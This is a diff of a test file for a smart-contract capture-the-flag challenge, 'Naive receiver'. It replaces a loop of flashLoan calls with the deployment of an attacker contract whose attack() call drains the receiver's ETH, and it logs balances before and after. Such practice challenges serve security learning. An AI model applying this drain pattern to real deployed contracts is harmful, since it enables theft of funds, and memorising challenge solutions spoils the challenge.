@@ -31,14 +31,24 @@ describe('[Challenge] Naive receiver', function () {
 
 	it('Exploit', async function () {
 		/** CODE YOUR EXPLOIT HERE */
-		for (i = 1; i <= 10; i++) {
-			await this.pool.connect(attacker).flashLoan(this.receiver.address, 0)
-		}
+		// Deploy attacker contract
+		const NaiveAttacker = await ethers.getContractFactory('NaiveAttacker', attacker)
+		this.attackerContract = await NaiveAttacker.deploy(this.pool.address)
+
+		// Attack
+		console.log(
+			'Receiver balance before attacking: ',
+			String(await ethers.provider.getBalance(this.receiver.address))
+		)
+		await this.attackerContract.connect(attacker).attack(this.receiver.address)
+		console.log(
+			'Receiver balance after attacking: ',
+			String(await ethers.provider.getBalance(this.receiver.address))
+		)
 	})
 
 	after(async function () {
 		/** SUCCESS CONDITIONS */
-
 		// All ETH has been drained from the receiver
 		expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal('0')
 		expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
